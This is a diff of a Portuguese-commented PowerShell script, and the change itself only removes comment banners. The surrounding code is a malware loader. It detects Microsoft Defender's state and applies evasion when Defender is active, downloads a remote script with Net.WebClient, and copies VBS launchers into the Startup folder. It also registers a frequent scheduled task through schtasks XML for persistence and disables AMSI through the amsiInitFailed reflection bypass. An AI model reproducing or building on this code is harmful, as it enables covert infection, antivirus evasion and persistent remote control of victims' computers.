@@ -24,9 +24,7 @@ $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
 
 if ($args -notcontains "-silent") {
-    # ============================================================
     # 1. Deteta estado do Defender
-    # ============================================================
     $defenderOff = $false
     try {
         $mp = Get-MpComputerStatus -ErrorAction Stop
@@ -35,9 +33,7 @@ if ($args -notcontains "-silent") {
         }
     } catch { }
 
-    # ============================================================
     # 2. Defesas — só se o Defender estiver ativo
-    # ============================================================
     if (-not $defenderOff) {
         $sd = "$env:TEMP\sd_$h"
         New-Item -ItemType Directory -Path $sd -Force -ErrorAction SilentlyContinue | Out-Null
@@ -73,9 +69,7 @@ if ($args -notcontains "-silent") {
         } catch {}
     }
 
-    # ============================================================
     # 3. Instalação
-    # ============================================================
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -94,9 +88,7 @@ if ($args -notcontains "-silent") {
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # ============================================================
     # 4. Persistência via schtasks.exe + XML — sem WMI do Agendador
-    # ============================================================
     try {
         $interval = if ($defenderOff) { 3 } else { 1 }
         $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
@@ -151,7 +143,6 @@ if ($args -notcontains "-silent") {
         cmd /c "schtasks /create /tn `"$taskName`" /xml `"$xmlPath`" /f" 2>$null
         Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
 
-        # limpa task repetida órfã de versões anteriores (se existir)
         cmd /c "schtasks /delete /tn `"$taskRepName`" /f" 2>$null
     } catch {}
 
@@ -162,9 +153,7 @@ if ($args -notcontains "-silent") {
     exit
 }
 
-# ============================================================
 # BLOCO -silent — o agente
-# ============================================================
 
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
